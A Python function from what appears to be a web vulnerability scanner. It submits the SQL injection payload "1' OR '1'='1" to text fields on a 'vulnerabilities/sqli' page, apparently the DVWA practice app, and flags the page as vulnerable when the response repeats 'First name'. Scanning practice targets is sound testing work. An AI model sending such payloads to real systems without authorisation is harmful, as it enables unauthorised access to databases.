def scan_sql(session, forms):
    print("\n[+] Starting SQL Injection Scan...")
    vulnerabilities = []

    payload = "1' OR '1'='1"

    for form in forms:
        if "vulnerabilities/sqli" not in form["action"]:
            continue

        action_url = form["action"].split("#")[0]  

        for input_field in form["inputs"]:
            if input_field["type"] == "text" and input_field["name"]:

                data = {
                    input_field["name"]: payload,
                    "Submit": "Submit"
                }

                try:
                    response = session.get(action_url, params=data)

                  
                    if response.text.count("First name") > 1:
                        print(f"[!!!] SQL Injection Found at {action_url}")

                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "url": action_url,
                            "parameter": input_field["name"],
                            "payload": payload,
                            "severity": "High"
                        })

                except:
                    continue

    return vulnerabilities